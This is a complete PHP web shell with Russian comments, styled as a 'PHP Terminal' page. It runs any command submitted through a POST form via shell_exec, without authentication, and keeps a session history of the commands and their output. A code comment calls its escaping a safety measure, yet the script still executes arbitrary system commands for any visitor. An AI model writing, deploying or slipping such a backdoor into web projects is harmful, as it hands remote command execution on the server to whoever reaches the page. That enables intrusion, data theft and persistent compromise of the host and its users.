<?php
// Включаем отображение ошибок для отладки
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Инициализируем сессию, чтобы работать с вводом/выводом команд в одном окне
session_start();

// Если была передана команда через POST, обрабатываем ее
if (isset($_POST['cmd'])) {
    $cmd = escapeshellcmd($_POST['cmd']);  // Экранируем команду для безопасности
    $output = shell_exec($cmd);            // Выполняем команду
    $_SESSION['history'][] = [
        'cmd' => $cmd,
        'output' => $output !== null ? $output : 'Error: Command failed or permission denied'
    ];
}

// Форма для ввода команды
echo '<html>
    <head>
        <title>PHP Shell</title>
        <style>
            body { font-family: monospace; background-color: #282828; color: #f0f0f0; }
            input[type="text"] { width: 100%; background-color: #333333; color: #f0f0f0; border: 1px solid #555555; padding: 10px; font-size: 14px; }
            .output { background-color: #1d1d1d; padding: 10px; margin-top: 20px; }
            .history { margin-top: 20px; max-height: 300px; overflow-y: scroll; }
            .history pre { background-color: #222222; padding: 10px; }
        </style>
    </head>
    <body>
        <h1>PHP Terminal</h1>
        <form method="post">
            <input type="text" name="cmd" placeholder="Enter command..." autofocus autocomplete="off">
        </form>';

// Если есть история команд, показываем их
if (isset($_SESSION['history'])) {
    echo '<div class="history">';
    foreach ($_SESSION['history'] as $entry) {
        echo '<pre><strong>Command:</strong> ' . htmlspecialchars($entry['cmd']) . '</pre>';
        echo '<div class="output"><strong>Output:</strong><br>' . nl2br(htmlspecialchars($entry['output'])) . '</div>';
    }
    echo '</div>';
}

// Выводим сообщение об успешном подключении
echo '</body>
</html>';
?>

